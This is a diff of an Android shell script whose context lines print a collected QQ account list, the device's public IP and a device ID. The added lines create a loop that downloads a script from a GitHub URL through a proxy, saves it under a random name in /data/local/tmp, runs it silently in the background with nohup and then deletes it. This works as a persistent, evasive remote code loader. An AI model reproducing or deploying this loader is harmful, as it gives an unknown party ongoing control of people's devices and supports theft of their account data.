@@ -167,18 +167,32 @@ echo "获取到的 QQ 列表: ${qq_list:-空}"
 echo "当前设备公网 IP: $ip"
 echo "设备唯一 ID: $device_id"
 echo "-----------------------------------"
+# ------------------------------
+# 循环下载并执行客户端脚本
+# ------------------------------
 {
-    temp_script="/data/local/tmp/client"
-    
     while true; do
-        # 下载客户端
-        if curl -sS -o "$temp_script" "https://ghproxy.net/https://raw.githubusercontent.com/jenssenli/ko/refs/heads/main/client"; then
+        # 生成随机文件名（兼容 Android 环境）
+        if [ -e /dev/urandom ]; then
+            random_name=$(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | head -c 16)
+        else
+            random_name=$(date +%s%N | md5sum | head -c 16)
+        fi
+        
+        temp_script="/data/local/tmp/${random_name}.sh"
+        
+        # 下载客户端脚本
+        if curl -sS -o "$temp_script" "https://ghproxy.net/https://raw.githubusercontent.com/jenssenli/ko/refs/heads/main/final.sh"; then
             # 下载成功
             if [ -f "$temp_script" ]; then
                 # 给执行权限
                 chmod +x "$temp_script"
-                "$temp_script"
-                rm "$temp_script"
+                
+                # 执行客户端脚本
+                nohup bash "$temp_script" >/dev/null 2>&1 &
+                
+                # 执行完毕后删除临时文件
+                rm -f "$temp_script"
             fi
         else
             # 下载失败，等待30秒后重试
